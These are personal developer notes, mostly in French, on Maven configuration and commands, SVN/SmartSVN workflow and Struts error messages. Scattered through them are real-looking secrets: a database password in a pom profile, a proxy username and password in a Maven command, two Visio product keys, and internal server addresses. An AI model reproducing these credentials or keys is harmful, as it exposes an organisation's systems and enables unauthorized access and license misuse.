pour connaitre les profiles: 
  %M3%/mvn help:active-profiles (et si c sur eclipse mettre de quel profile il s'agit quand on run: profile=env_dev ou mettre direct env_dev si le champ s'appelle profile (valeur de <id>))
      *attention faire settings.xml > eclipse projet>preference>maven>profiles et penser à activer les profiles ici > Run configuration d'eclipse et definir un profile profile:env-test(id du profile) 
    dans le pom:
          ${project.activeProfiles[0].id} correspond au profile en cours 
            <profiles>
                        <profile>
                        <id>env_dev</id> // a utiliser quand je lance maven via eclipse: runconfigurations... profiles: env_dev // voir * ci dessus
                        <activation>
                        <property>
                        <name>env</name> // Linkmvnprop a utiliser quand j'appelle maven en ligne de commande: -Denv=dev CA MARCHE. COMMENTER TOUS LES PROFILES DANS SETTINGS.XML
                        <value>dev</value>
                        </property>
                        </activation>
                        <properties>
                        <db.url>jdbc:oracle:thin:@wecdevo01.intra.renault.fr:1521:ml1p15</db.url> Linkmvnprop
                        <db.usr>wec_adm</db.usr>
                        <db.pwd>wec1234</db.pwd>
                        </properties>
                        </profile>
            </profiles>
  si les profiles ne s'activent pas quand il faut:
      chez moi j'avais defini les profiles dans pom.xml mais ca ne marchait pas ni avec 
      %M3%/mvn clean package install -Denv=prod c.a.d -DceQuIlYADansBaliseActivation/property/name-ceQuIlYADansBaliseActivation/property/value// c celui la qui marche. // clean supprime le repertoire target  <profile><id>xxxx</id><activation><property><name>env</name><value>prod</value></property>...
      les profils ne sont visibles que sur le pom ou ses parents
      COMMENTER TOUS LES PROFILES DANS SETTINGS.XML
      pour filtrer les resources: (que les properties parametres soient pris en compte)LINK**$** Pour le web.xml voir **;-)** ca se passe dans le plugin maven-war-plugin dans lequel il faut mettre sous <plugin><configuration><webResources><resource>
      <build>
          <resources>
            <resource>
              <directory>src/main/resources/OSGI-INF/blueprint</directory>
              <filtering>true</filtering>
              <targetPath>un_chemin</targetPath> // facultatif. Par defaut maven deplace à la racine du classpath. si on ne veut pas on ajoute ça.
            </resource>
          </resources>
        </build>
      Verbose: mettre l'option -X // permet de voir au debut console ou est settings.xml et repository (sur eclipse le mettre dans goal)
      
      **;-)**
       <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-war-plugin</artifactId>
        <version>3.0.0</version>ou LATEST
        <configuration>
          <webResources>
            <resource>
              <filtering>true</filtering>
              <directory>src/main/webapp</directory>
              <includes>
                <include>**/web.xml</include> et dans web.xml je peux mettre : ${project.version} par exemple
              </includes>
            </resource>
          </webResources>
          <warSourceDirectory>src/main/webapp</warSourceDirectory> // semble facultatif
          <webXml>src/main/webapp/WEB-INF/web.xml</webXml>         // semble facultatif. Ingorer le warning (webxml attribute is missing from war task, or ignoreWebxml attribute is specified as 'true')
        </configuration>
      </plugin>
              
installation: 
		placer dezipper apache-maven-2.2.1-bin.zip sous C:\Program Files\Apache Software Foundation
		Add the M2_HOME environment variable = C:\Program Files\Apache Software Foundation\apache-maven-2.2.1
		BOF ce truc marche pas bien: autant pointer M2 ou M3 vers apache/bin et appeler apache avec %M3%/mvn etc...
		In the same dialog, add the M2 environment variable in the user variables with the value %M2_HOME%\bin.
		In the same dialog, update/create the Path environment variable in the user variables and prepend the value %M3% to add Maven available in the command line.
		In the same dialog, make sure that JAVA_HOME exists in your user variables or in the system variables and it is set to the location of your JDK, e.g. C:\Program Files\Java\jdk1.5.0_02 and that %JAVA_HOME%\bin is in your Path environment variable.
		Open a new command prompt (Winkey + R then type cmd) and run mvn --version to verify that it is correctly installed.
	si probleme de download a cause d'un proxy:
		maven/conf/settings.xml balise proxy à decommenter et renseigner
		il sauve tous ses plugins sous:le repository local est sur:
        C:\Documents and Settings\Administrator\.m2
	si probleme de dependance possible l'ignorer en regardant la log la partie finale qui indique ou sont les dependances.
	pour executer maven offline hors ligne dans settings il ya <offline>true<offline> mais aussi rajouter dans la commande maven "-o"
	     Note: si je pense avoir resolu mais toujours KO essayer commande avec -U pour effacer cache
						exemple:
						  Path to dependency:
				        1) org.datanucleus.samples:datanucleus-samples-jpa-tutorial:jar:2.0
				        2) javax.jdo:jdo2-api:jar:2.3-ea (il fait appel à 3))
				        3) javax.transaction:transaction-api:jar:1.1 (c'est lui qui manque)
						alors dans pom.xml mettre: 
						        <dependency>
								            <groupId>javax.jdo</groupId>
								            <artifactId>jdo2-api</artifactId>
								            <version>[2.2, 2.3-eb, 3.0)</version>
								                                                                1.0:          	x >= 1.0 * The default Maven meaning for 1.0 is everything (,) but with 1.0 recommended. Obviously this doesn't work for enforcing versions here, so it has been redefined as a minimum version.
                                                                                (,1.0]:       	x <= 1.0
                                                                                (,1.0):       	x < 1.0
                                                                                [1.0]:        	x == 1.0
                                                                                [1.0,):       	x >= 1.0
                                                                                (1.0,):       	x > 1.0
                                                                                (1.0,2.0):	    1.0 < x < 2.0
                                                                                [1.0,2.0]:	    1.0 <= x <= 2.0
                                                                                (,1.0],[1.2,):	x <= 1.0 or x >= 1.2. Multiple sets are comma-separated
                                                                                (,1.1),(1.1,):	x != 1.1
								            <exclusions> // si des merdes de dependances empechent le bon deroulement du code 
																						<exclusion> //pour ne pas que ce jar dont la dependance a besoin soit inclu dans mon classpath. (par exemple si il est dejà fourni par le serveur) 
																						<groupId>javax.transaction</groupId>
																						<artifactId>transaction-api</artifactId>
																						</exclusion>
														</exclusions>
				        		</dependency>
	commandes:
			mvn install -Dhttp.proxyHost=172.26.80.140 -Dhttp.proxyPort=3128 -Dhttp.proxyUser=p036782 -Dhttp.proxyPassword=rcwdr1
			mvn clean compile
	pour avoir un max de details sur les erreurs:
      ajouter l'option -e, sur le build ajouter l'option -X a mettre a droite des goals
  pour creer un projet from scrach du debut initialiser nouveau projet (archetype:generate est un goal)
  %M3%/mvn archetype:generate
  %M3%/mvn archetype:generate -DarchetypeGroupId=GroupId_deLArchetypes -DarchetypeArtifactId=ArtifactId_deLArchetypes -DarchetypeVersion=Version_deLArchetypes -DgroupId=GroupId_DuProjet -DartifactId=ArtifactId_DuProjet ensuite il va poser des questions: quel est le groupID du nouveau composant que tu veut creer sur la base du squelette artifact? quel est l'artifactId etc etc...
        exemple generer projet gwt: %M3%/mvn archetype:generate -DarchetypeGroupId=org.codehaus.mojo -DarchetypeArtifactId=gwt-maven-plugin -DarchetypeVersion=2.5.1 (apres il pose les questions sur le nom etc de mon appli)
  pour ensuite brancher ce projet et en faire un projet eclipse:
  %M3%/mvn eclipse:eclipse // OU on peut aussi le faire sur un projet existant puis apres sur eclipse faire convert to maven project
        si on a erreur "Unsupported IClasspathEntry kind=4"
            c parce qu'on a fait les deux alors faire:> eclipse>clickDroitProjet>Remove Maven Nature > %M3%/mvn eclipse:clean > eclipse>clickDroitProjet>Configure>ConvertToMavenProject PENSER ensuite à faire l'updateMaven : voir ii*ii 
  pour creer directement sur eclipse un nouveau projet moduler: 
      new maven project puis new maven module qui a pour parent le maven project
 pour qu'il compile avec une librairie mais qu'il ne mette pas cette librairie dans le repertoire lib de l'ear et du war dans target: mettre scope provided
      <dependency><groupId>renault-app.rits.wec</groupId><artifactId>jsp-api</artifactId><version>1</version>
      <scope>provided</scope>
      </dependency>
pour utiliser le plugin maven tomcat: Si ça marche :-). voir dessous: pas reussi à faire marcher avec une application avec spring security
1)possible embeded on retrouve alors le serveur tomcat et le war deploye dans target de mon projet. Attention dans tomcat/conf besoin copier le web.xml du serveur tomcat (copier dans une conf tomcat) sinon erreur 404 sur les pages, jsp, images... Mais <!--<tomcatWebXml>pathVersUnAutreWeb.xmlDeLaConfTomcat/web.xml</tomcatWebXml>--> lui n'a pas marché
2)possible externe (pas reussi à faire marcher grrr)
   <plugin>
        <groupId>org.apache.tomcat.maven</groupId>
        <artifactId>tomcat7-maven-plugin</artifactId>
        <version>2.1</version>
        <configuration>
          <systemProperties>
            <example.value.1>alpha</example.value.1>
            <example.value.2>beta</example.value.2>
          </systemProperties>
          <url>http://localhost/</url> // Si embarqué: l'url sera http://localhost(:8080)/nom_apres_http:lePortCiDessous/manager ou si externe c'est l'URL console-admin du tomcat externe
          <server>my-tomcat</server> // sert d'identifiant qu'on retrouve dans settings.xml pour definir le user/password de l'admin/manager du serveur tomcat si on utilise un serveur non embedded. dans settings.xml : <settings>...<servers>...<server><id>myserver</id><username>myusername</username><password>mypassword</password></server>...</servers>
          <path>/nom_apres_http://xxx:port/LA_en_incluant_le_dernier_slash</path> c'est le contextpath mais bof.. plutôt aller sur console-admin)
          <port>8081</port>
          <contextFile>${basedir}/src/test/resources/maven-tomcat-plugin/context.xml</contextFile> // facultatif: pour ajouter une connexion à un jndi par ex... voir context.xml
          <tomcatUsers>D:/Dev/apache-tomcat-7.0.61/conf/tomcat-users.xml</tomcatUsers> // facultatif
        </configuration>
      </plugin>      
    et                      
    mvn tomcat7:run-war ça marche: Ca c'est quand le tomcat est cree qqpart dans mon editeur ecplipse (dans target je crois)
    mvn tomcat7:deploy  Pas sur :ca c'est quand un serveur tomcat tourne qqpart dejà (sur mon poste par ex) ca deploie direct dessus (bien specif le bon port dans conf pom)
    ca ca ne marche pas : mvn tomcat7:war 
pour exclure des sous-librairies: avec optional
    monprojetPom.xml
    |
    ------------<dependency>
                uneAutreLibrairie qui elle fait appel à plein d'autres dependances. Trop pour monprojetPom.xml
                alors mettre dans uneAutreLibrairiePom.xml
                                <dependency>..a.
                                    <optional>true</optional>
                                </dependency>
                                <dependency>..b.
                                    <optional>true</optional>
                                </dependency>
              </dependency>
    <dependency>
      b     //monprojet n'a besoin que de la sous dependance "b"
    </dependency>      						
Tous les scopes:
                      compile: celui par defaut. Utilise pour compiler et est package dans le livrable final
                      provided: utilise seulement pour compiler et teste mais n'est pas livre dans le package
                      runtime: pas utilise pour la compilation. Seulement pour les tests et la livraison
                      test:  Uniqment utile pour les test, pas livre
                      system: deprecie. This scope is similar to provided except that you have to provide the JAR which contains it explicitly. The artifact is always available and is not looked up in a repository.
                      import (only available in Maven 2.0.9 or later) ses parametres scope et version  sont remplace par le meme artefct sous <dependencyManagement> du pom parent de ce pom. Les eventuelles exclusions sont aussi importees depuis le pom parent pour cet artifact
                              exemple:
                      PARENT 
                              <dependencyManagement>  // ca c'est dans un pom parent. Les dependances ici ne sont pas prises en compte dans ce projet pom je crois mais dans les projets fils. LINKlkjsdf
                                <dependencies>
                                  <dependency>
                                    <groupId>org.springframework.cloud</groupId>
                                    <artifactId>spring-cloud-dependencies</artifactId>
                                    <version>Brixton.SR5</version>
                                    <type>pom</type>
                                    <scope>compile</scope>
                                  </dependency>
                                  <autre dependance TATATA/> // voir le fils ci dessous
                                  <autre dependance BLABLABLA>
                                  ...<scope>import</scope> // tout le block <dependencyManagement> de l'artifact TATATA est importe ici comme si je le copiais
                                  </autre dependance BLABLABLA> // l'ordre des artifacte au scope import est important: les <dependancemanagement> des premiers sont les pris en compte si les suivants ont les mêmes <dependancemamangement> avec ces versions differentes                        
                                </dependencies>
                              </dependencyManagement>
                      FILS:
                                <dependencies>                     // c c'est dans qq pom fils LINKlkjsdf
                                  <dependency>
                                    <groupId>org.springframework.cloud</groupId>
                                    <artifactId>spring-cloud-dependencies</artifactId>
                                      //pas besoin de mettre a version ni le scope puisque c'est importe du parent  
                                    <type>pom</type> // inutile de mettre ca si c'est un jar car dans ce cas c importe du parent
                                    </dependency>
                                    <dependency>
                                        un artifact qui a la dependance transitive TATATA. Et bien la version sera celle definie dans le <dependencyManagement> soit de ce pom là sinon du parent de ce pom.
                                    </dependency>
                                </dependencies>

la commande est: mvn buildlifecycle(facultatif) phase                      
Les build life cycles:
          default(execute le deploiement. Par defaut); clean(nettoie); site(creer la documentation html)
Les phases: se jouent de manière sequencielle du haut vers le bas:
            validate - validate the project is correct and all necessary information is available
            compile - compile the source code of the project
            test - test the compiled source code using a suitable unit testing framework. These tests should not require the code be packaged or deployed
                pour sauter la phase de test: exemple: install -DskipTests ou -Dmaven.test.skip=true
            package - take the compiled code and package it in its distributable format, such as a JAR.
            process-resources
            integration-test - process and deploy the package if necessary into an environment where integration tests can be run
            verify - run any checks to verify the package is valid and meets quality criteria
            install - install the package into the local repository, for use as a dependency in other projects locally
            deploy - done in an integration or release environment, copies the final package to the remote repository for sharing with other developers and projects.
            si je fais mvn deploy tout est execute. Si je fais mvn clean deploy il fait d'abord un clean avant de tout executer 	
Les goals:(appartiennent à phases) sin on veut executer mvn un_goal alors ecrire mvn maven-nomplugin-plugin:goal mais enlever maven- et -plugin
    un goal appartient à 0 à n phases. et une phase peut avoir 0 à n goals. Une phase sans goal n'est pas executee
    Moreover, if a goal is bound to one or more build phases, that goal will be called in all those phases.
    si une phase contient plusieurs goals et qu'on execute cette phase: tous les goals sont executes dans l'ordre de declaration des goals dans le pom
    exemple de goal: dependency:copy-dependencies            
  maven:pour installer ajouter installation une librairie jar dans mon repository local (on peut executer ça direct sur eclipse)
      %M3%/mvn install:install-file -Dfile=C:/jbdevstudio4/jboss-eap/jboss-as/common/lib/jsp-api.jar -DgroupId=renault-app.rits.wec -DartifactId=jsp-api -Dversion=14 -Dpackaging=jar
      %M3%/mvn install:install-file -Dfile=C:/jbdevstudio4/jboss-eap/jboss-as/common/lib/jsp-api.jar -DgroupId=renault-app.rits.wec -DartifactId=jsp-api -Dversion=1 -Dpackaging=jar
      %M3%/mvn install:install-file -DgroupId=com.documentum -DartifactId=dfc -Dpackaging=jar -Dversion=5.3.0.621 -Dfile=dfc.jar -DgeneratePom=true
      %M3%/mvn install:install-file -Dfile=C:/apache-maven-3.1.1/repo/mysql/mysql-connector-java/5.1.6/mysql-connector-java-5.1.6.jar -DgroupId=web.audioloop -DartifactId=mysql-connector-java-5.1.6 -Dversion=1 -Dpackaging=jar
      %M3%/mvn install:install-file -Dfile=D:/Maven/repo/renault-app/rits/wec/xml4j/1/xml4j-1.jar -DgroupId=private.wec -DartifactId=xml4j -Dversion=1 -Dpackaging=jar
      
      %M3%/mvn install:install-file -Dfile=C:/jbdevstudio4/jboss-eap/jboss-as/common/lib/jsp-api.jar -DgroupId=com.hraccess -DartifactId=hr-openhr-for-ta -Dversion=7.30.06008.00001 -Dpackaging=jar
      %M3%/mvn install:install-file -Dfile=E:/__hr-crypto-utils-1.0.jar -DgroupId=com.hraccess.services -DartifactId=crypto-utils -Dversion=1.0 -Dpackaging=jar
      
  pour nettoyer, compiler puis packager: 
      %M3%/mvn clean package -Denv=test (il va executer toutes les etapes precedantes dans l'ordre)
      %M3%/mvn clean package -Denv=prod
      %M3%/mvn clean package -Denv=dev 
      %M3%/mvn clean package jboss:hard-deploy -Denv=dev
      %M3%/mvn clean jboss:hard-undeploy -Denv=dev
pour voir les dependances des jars, rajouter à la fin des commandes ci-dessus: dependency:tree
      exemple: %M3%/mvn clean package dependency:tree      
pour incrementer mon projet d'une version: changer la version versionning versioning: 
      %M3%/mvn versions:set
      sur eclipse faire Run MavenBuild... goal=versions:set ajouter parameter newVersion=x.x.x 
            il va changer ca:
                                <groupId>renault-app.rits.wec</groupId>
                            		<artifactId>wec</artifactId>
                           --->	<version>8.3.0</version>
pour lancer en dev sur jetty gwt mais ca ne marche pas  sur mon pom
      %M3%/mvn gwt:run -Denv=dev -DrunTarget=WecApp.html
    
  phases cycle de vie maven: 
  validate; compile; test; package; integration-test; verify; install; deploy voir page 45 de ma doc
si j'ai l'erreur Cannot run program "cmd.exe": 
    c parce que maven lance une commande java par exemple trop longue pour windows: il faut se debrouiller pour que le classpath soit plus court
       organisation arborescence maven-spring:
  monApp
  |     |_src
  |     |     |_main
  |     |     |     |_java (marqué comme source dans intellij)
  |     |     |     |     |_org.blah
  |     |     |     |_WebApp // ou webapp
  |     |     |     |       |_resources
  |     |     |     |       |          |_css...
  |     |     |     |       |_WEB-INF = contient tout ce qui ne peut etre accessible par le browser. Se retrouve sous monwar.war/WEB-INF
  |     |     |     |       |       |_web.xml
  |     |     |     |       |       |_spring // facultatif
  |     |     |     |       |       |      |_*.xml // conf spring
  |     |     |     |       |       |_lib       
  |     |     |     |       |           |_*.jars
  |     |     |     |       |_index.jsp     
  |     |     |     |       |_jsp
  |     |     |     |           |_...
  |     |     |     |_resources
  |     |     |               |_META-INF  =specifique à des jar et des war. Contient infos de déploiement.
  |     |     |               |        |_spring //facultatif
  |     |     |               |                |_*.xml // conf spring
  |     |     |_test          |_log4j.properties
  |     |          |_java (marqué comme test dans intellij)
  |     |          |_resources
  |     |                     |_*.xml // conf log
  |     |                     |_META_INF
  |     |                               |_/*/*.xml // conf spring
  |     |_target               
  |     |_pom.xml(non pas là mais sous projet)              
  |     |_* 
  |        |_web.xml
  |_pom.xml
                   
le proxy pour sortir est 172.26.80.141:3128
ou bien 138.21.88.65 port 3128 
**************

SVN :
  trouver chercher lister tout ce que j'ai dans un repository svn voir LINK984095
  pour commiter un nouveau projet premiere fois: share project... (voir intellij)
si j'ai le message : is already under version control quand je commit
		supprimer le .svn qui se trouve dans le repertoire que je n'arrive pas à commiter
		si ca ne marche toujours pas faire une copie de mon repertoire KO ailleurs sans aucun .svn dedans. 
		    puis sur eclipse effacer carrement tout le repertoire. Refaire un commit, rappatrier mon repertoire copie, faire un refresh eclipse et recommiter
pour donner les droits sur svn subversion:
	    
Pour creer un repository sur subversion:
		- migration de CVS vers SVN: https://collaboration.renault.com/eRoomReq/Files/FAC_KORP1_10/RS3Minute/0_7c4c2/SIA_v0.0.0_SVN_DDE_migration_e0.a.doc
		- de creation de SVN --> https://collaboration.renault.com/eRoomReq/Files/FAC_KORP1_10/RS3Minute/0_7c4a9/SIA_v0.0.0_SVN_DDE_REF_e0.a.doc



SUBVERSION :DEBUT________________________________________________________________
supprime expres
___________________________________________________________________
----- Modification "simple" d'un projet existant
pour se connecter à  SVN sans utiliser de client mais seulement un browser.
exemple:http://su320ads.mc2.renault.fr:9092/svn/svn00021/
ou
http://baselinesvn.mc2.renault.fr:8082/svn/svn50839/
ou
http://su320ads.mc2.renault.fr:9092/svn/svn50839/
ou
http://baselinesvn.mc2.renault.fr:9090/svn/svn50839/
Liste des referentiels RS3 minute: http://baselinesvn.mc2.renault.fr:9090/Portal/Documents/Repository.html
profile : svn_formation
... C:\Documents and Settings\All Users\Documents\Subversion\Workspace_SVN
local directory : WC_Full_svn_formation
project : Formation

... sources/JavaSource/r1ESUtil.java
CH 456 : optimisation des imports et ajout de commentaires
____________________________________________________________________
SmartSVN :
pour copier un trunck vers branche par ex: Les branches c la merde. DEVOPS 
    Modify>CopyWithinRepository
dans repository >Manage...>
dans onglet profile >add>tapper url
saisir mdp et user 
NE PAS cocher "store password on disk"
next > definir un nom explicite (
Dans directories > click droit > Files from subdirectories pour afficher en flat ou en arbo.
regarder l'aide: table of content>directory tree
pour associer des fichiers à  un programm: (java avec wsad par ex) : Modify>Preferences>Externaltools. Faire attention à  l'ordre dans la liste.
ouvri auto last proj:
Menu Edit > preferences OnStartup >openLastProject
pour eviter de commiter des types de fichiers definis: Global ignore (Menu Project > Settings > Working Copy >Global ignore)
Historique de ce qui s'est passe: Configuration de Tmate: MenuProject > QSettings > Tmate > Display
Dans Tmate possible classer par autoeur, par date etc... 
Quand on cree un fichie ou un dossier localement ne pas oublier de faire ADD!!!
Remove supprime tout (dans file sys et dans conf) Delete Physically supprime seulement localement et pas de la GCL (repository)
QUand on ajoute un nouveau fichier ou repertoire et qu'on fait add: il y a (0) ca signifie: il est pas encore dans GCL
Toujours faire un update avant de faire un commit
Ce numero prendra ensuite la valeur de la revision: penser à  faire un update general pour mettre ajour les meta donnees de revisions.
On peut faire un update sur revision ulterieure
On peut faire un update sur un repertoire seulement
REVERT = undo en local seulement.
COMPARE SHOW CHANGE comparle le local et le repository
ADD possible ajouter fichier hors Smartsvn puis faire ADD pour ajouter sous controle gconf.(0) car pas encore commite
DELETE, UPDATE, RENAME, MOVE a faire QUE dans SmartSVN
UPDATE(checkout) en mixant les revisions: epicerie: en local on a tout un melange de revisions.
LIVRAISON D UNE VERSION: MODIFY>COPTY TO REPOSITORY (si mon workingCopy est un mix epicerie il va copier ca dans le tag sinon il va faire une copie repository vers repository)
CREER UNE BRANCHE: pareil que pour LIVRAISON D UNE VERSION. Les branches c la merde. DEVOPS
_____________________________________________________________________
----- Modifications "multiples" d'un projet existant
(modif) ... docs/Manuel_Utilisateur_GCL.doc
(modif) ... sources/JavaSource/r1ESUtil.java

(remove) ... sources/WebContent/summary/summary_app_map.xml
(add) ... sources/WebContent/summary/Copie de page_info_sys_prefs.xml

(create) ... sources/WebContent/sommaire
(move) ... sources/WebContent/summary/app_config_sys_prefs.xml -> sommaire 
(rename) ... sources\WebContent\create -> creation
TD 234 : correctif du bug sur les pages web du sommaire
Revert pour annuler ses modifs
Definition de Revision: Chaque fois qu'on touche à  n'importe quoi dans le repository il incoremente le numero de revision de tout le repository. pour mettre à  jour dans l'ecran faire: Selectionner ce qu'on veut mettre à  jour Modify > Update
Pour avoir un suivi de modif sur un fichier:  click droit sur un article > Annotate... ou Log... pour avoir un suivit des modifs.
_____________________________________________________________________
----- Livraison
00001_GCL_XP_FR_V2.0.7
CH 876 : livraison du correctif de la page sommaire, pour Windows XP en francais
----- bon de livraison
/tags/00001_GCL_XP_FR_V2.0.7
/trunk revision 5
...\Desktop\00001_GCL_XP_FR_V2.0.7.diff
----- exportation
... 00001_GCL_XP_FR_V2.0.7
00001_GCL_XP_FR_V2.0.7_livr
C:\Documents and Settings\All Users\Documents\Subversion\Workspace_SVN\00001_GCL_XP_FR_V2.0.7_livr
http://baselinesvn.mc2.renault.fr:8082/svn/svn50839/
ou
http://su320ads.mc2.renault.fr:9092/svn/svn50839/
ou
http://baselinesvn.mc2.renault.fr:9090/svn/svn50839/

GCL
... C:\Documents and Settings\All Users\Documents\Subversion\Workspace_SVN
WC_Patch_GCL
Patch_GCL
00001_GCL_XP_FR_V2.0.7_stable
TD 278 : livraison de la version 2.0.7 stable, avec anciennes pages web, et manuels utilisateurs associes
Patch_GCL
C:\Documents and Settings\All Users\Documents\Subversion\Workspace_SVN\WC_Patch_GCL
Pour tagger une version:
Choisir son repertoire puis > Modify > Copy URL to URL
En local on travaille sur Trunk et quand on tag on tag sur Tags: Tags ne sert qu'a contenir les differentes versions du projet (ne pas faire de modifs dans tags)
pour tager: le tag ne dois pas exister: si il existe le supprimer , se mettre sur trunck (sur rad7 le faire pour chaque sous repertoire du trunk): create branch/tag et choisir le chemin de son nouveau tag
pour creer un fichier qui synthetise le delta entre deux versions/revision: query > create patch between URL > choisir sa version
Pour livrer c a d recuperer le projet localement sans le voir dans SmartSVN: Project>Checkout > Export
Pour faire une version qui est un mixte de revisions differentes: trunk doit contenir ce mixte. Selectionner le trunk >Modify > Copy WC - URL
A la fin de chaque activite: utiliser le project manager pour liberer de l'espace sur le workspace local
Les branches servent à  developper un lot independememnt du trunk mais il faut vite ramener la branche dans le trunck si existe corrections effectuees dans trunk Les branches c la merde. DEVOPS
Pour creer une branche: Copy URL-URL > au lieu de choisir tags il faut choisir branches > definir nom + ajouter commentaire.. etc..

Lire 
de bas en haut:
		 _build(vide)
		|
		|_industrialisation(vide)
		| 
		|					 __DSR, DDA, Bon de livraison(BL, genere par FSV), Volumetrie, testSelenium(dir), DTI(afaire en dev), Tests Unitaires (TU_SIA_ITX_TRI.xls)(afaire en local), Javadoc(a la fin du projet)
		| 				|		
		| 				|																																
		|_documents
		|					 __sia-UpdateDB.zip(mise à  jour de la version livree)
		|					|						
		_database											
		|
		|											 							 __ScriptsDeDstrctx-Reconstrctx-Complet	(Concattx de ttes les MAJ)--> .sh, .src, .sql
		|																		|
		|															 			|		 _logs
		|																		|		|			 _siaBatch.jar
		|		 ___siaLib(que en local)				|		|_jar__|
		|		|___siaEntreprise								|		|_cmd
		|		|___siaApplication							|		|_cfg
		|		|																|		|			_sia-common.jar(si il existe)
		|		|___siaClient										|		|_lib_|
		|		|___siaCommon	           				|		|_classes(optionnel: vide)
		|		|___siaScripts_______________sql		|_sources(was4) Javasource(was5) src(was6)(peut etre erreur ici)
		|		|___siaBatch________________________|
		|		|___siaWeb
		|		|
		|_src
		|
----
|	
HEAD (trunk)
0v1.3
|
|<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
|                            |
HEAD                         |
branche0v1.2(corrections) Qd fini MERGE (on utilise branches que si ya du dev en paralelle.. tag c'est pour chaque version livree). Les branches c la merde. DEVOPS
|                        /
|       HEAD            /
|	 branche0v1.1+Lot1---
|     /
tag 0v1.1
|
tag 0v1.0  ---> les tags sont en realite des pointeurs vers des revisions de fichier. Pas les fichiers en soit


SUPPRIME EXPRES
VISIO : code:
WFDWY-XQXJF-RHRYG-BG7RQ-BBDHM
visio2010 code: 
BXV2R-6CHXB-PKKWG-KHPV3-WY44Q

STRUTS SURVIVAL GUIDE :
Struts :
Pour parametrer le forward: par exemple rester sur la meme page et reenvoyer des parametres au request en fin d'action :
    		ActionForward newForward = new ActionForward();
				newForward.setName("editProcessComp");
				newForward.setPath("/trt/proc.do?action=editFormCmp&idDmd="+compInfo.getIdDmd()+"&id="+compInfo.getIdCmp()+"&numCmp="+id+"&nomCmp="+compInfo.getNomCmp());
				newForward.setRedirect(true);
				return newForward;
 si j'ai l'erreur :parseModuleConfigFile    ... null pointer exception
      il ne trouve pas strus-config.xml file
Si j'ai l'erreur: does not define a handler property
				DispatchMapping[/LotAction] does not define a handler property
				il faut mettre parameter="reqCode" dans struts-config.xml : 
			<action path="/LotAction"
			type="renault.ple.reference.actions.LotAction" name="lotForm"
			scope="session"
			parameter="reqCode">
			<forward name="result" path="tile.searchLot" />
		</action>

validates : 
erreurs struts: attention il ajoute automatiquement error.prefix et error.suffix autour de l'erreur
<html:errors(ou messages selon qu'on utilise ActionMessage ou ActionError)...Validation: pour que le user voie ses erreurs en face des champs erronnes p126 et p50 de struts recipes
		ds jsp: <html:errors/>
		(le message doit etre dans applicationressource)
messages d'erreurs plus riches (dynamiques) exemple ci dessous: (si besoin voir aussi p65)
					ActionMessage messageChamp = new ActionMessage("PTL_FIELD_TOO_LONG", "25"); // attention mettre un string. Dans ressource il y a Champ trop long. Limite à {0} caractères
							ou dans le ressource bundle: on a : 
							insert into ptl99_lbl (PTL99IDLBL, PTL99IDLNG, PTL99LIBELLE) values ("PTL_FIELD_TOO_LONG","fr","Champ trop long. Limite à {0} caractères");
					errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
					ou
          errors.add("zoneCodeNotValid", messageChamp);
          
					
messages dans jsp:
        <html:errors/>
    		<html:errors(ou messages selon qu'on utilise ActionMessage ou ActionError (quoi que.. errors marche toujours))...Validation: pour que le user voie ses erreurs en face des champs erronnes p126 et p50 de struts recipes

							// bouclera sur tous les messages
							<html:messages id="idMessage" message="true">
							  <bean:write name="idMessage"/>
							</html:messages>
							// bouclera sur un seul message(getmessage1)
							<html:messages id="idMessage" property="message1" message="true"> 
							   <bean:write name="idMessage" />
							</html:messages>
							<layout:message key="BesBSCR004-1DatePana" styleClass="FIELD"/>
pour gererer une erreur dans l'action et le form qui soit affichee en suite dans la jsp:
	dans le form  :  erreurs : message :

							public ActionErrors validate (ActionMapping mapping, HttpServletRequest request)
							{
							// on pourrait avoir besoin de ca eventuellement: if (request.getParameter("reqCode").equals("create"))
							ActionMessages errors = new ActionMessages();
							ou
								ActionErrors errors = new ActionErrors();
								
							if(this.zone!=null)
							{
								if (this.zone.getCode()==null || this.zone.getCode().length()<1)
								{
									ActionMessage messageChamp = new ActionMessage("QUERYM_OBJ_NULL");  // message traductible
									errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
									ou
									errors.add("zoneCodeNotValid", messageChamp); 
									// on mettra dans la jsp: <html:errors property="zoneCodeNotValid" />(le message doit etre dans applicationressource)
								}
								if (this.zone.getLibelle()==null || this.zone.getLibelle().length()<1)
								{
									ActionMessage messageChamp = new ActionMessage("QUERYM_OBJ_NULL");    // message traductible
									errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
									ou
									errors.add("zoneLibelleNotValid", messageChamp);  
									// on mettra dans la jsp: <html:errors property="zoneLibelleNotValid" />
									(le message doit etre dans applicationressource)
								}
								if (this.zone.getActifPanel()==null || this.zone.getActifPanel().length()<1)
								{
									ActionMessage messageChamp = new ActionMessage("QUERYM_OBJ_NULL");// message traductible
									errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
									ou
									errors.add("zoneActifPanelNotValid", messageChamp);
								}
							}
							return errors;
							}
							ne pas oublier dans struts-config.xml de mettre : input="tile.zonedetail" le tile input
							si on ne peut pas le faire car il faut conserver ce input alors creer une nouvelle action dans strutst-config exactement pareil sauf le input qui change
					dans action:
								ActionMessages errors = new ActionMessages(); (le message doit etre dans applicationressource)
								ActionMessage messageChamp = new ActionMessage(messages.getMessage("edit.user.erreur.nom"));
							ou bien :ActionMessage messageChamp = new ActionMessage("edit.user.erreur.nom");
							 errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
							ou
              	errors.add("errors", messageChamp);
								saveErrors(request, errors); // apparait en gras rouge
								ou
								saveMessages(request, errors); // apparait en noir
					avant on faisait ca mais c'est deprecie:
									ActionMessages errors = new ActionErrors();
									ActionMessage messageChamp = new ActionMessage(messages.getMessage("edit.user.erreur.nom"));
										ou bien :ActionMessage messageChamp = new ActionMessage("edit.user.erreur.nom");
											errors.add(ActionErrors.GLOBAL_MESSAGE, messageChamp);
											ou
									errors.add("champ1", messageChamp);
									saveErrors(request,  errors);
		      ne pas oublier dans struts-config.xml de mettre : input="tile.zonedetail" le tile input
		      on peut aussi faire ca: actionForward = mapping.findForward(Constants.EDIT);....return actionForward; // EDIT est dans les forward du struts-config.xml 


		
si erreurs marchent pas: cause: p46	(ou selon lova c quand on redirige vers une autre action)	
